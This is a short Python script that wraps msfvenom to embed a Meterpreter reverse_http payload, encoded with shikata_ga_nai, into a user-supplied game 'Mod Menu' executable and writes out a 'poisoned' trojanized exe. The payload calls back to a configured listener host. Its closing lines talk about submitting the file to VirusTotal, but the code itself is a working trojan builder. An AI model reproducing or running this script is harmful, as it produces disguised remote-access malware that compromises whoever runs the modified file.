#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
# from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

payload_Generate = 'windows/meterpreter/reverse_http'
LHOST = '8.8.8.8'
LPORT = '443'
input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
bad_Bytes = 'x00'
payload_Encoder = 'x86/shikata_ga_nai'
payload_Iterations = '1'
output_Format = 'exe'
# output_Dir = '/root/Desktop/'
# Lets just keep the code simple, all the user has to do is copy and paste the file path, and rename the file
output_File = str(raw_input("Enter the output path of the Mod Menu file: "))

cmd_String = "msfvenom -p {0} LHOST={1} LPORT={2} -x {3} -b '\{4}' -e {5} -i {6} -f {7} -o {8}".format(
    payload_Generate,
    LHOST,
    LPORT,
    input_Mod_Menu,
    bad_Bytes,
    payload_Encoder,
    payload_Iterations,
    output_Format,
    output_File
)
print 'Now running command: ' + cmd_String
os.system(cmd_String)
print 'Poisoned Mod Menu file generated, please see: ' + output_File + ' to submit it to VirusTotal!'
print 'DISCLAIMER: Please wait up to 2 weeks so that all the AV solutions will begin accusing it of being a virus and get it auto-deleted on their machines'
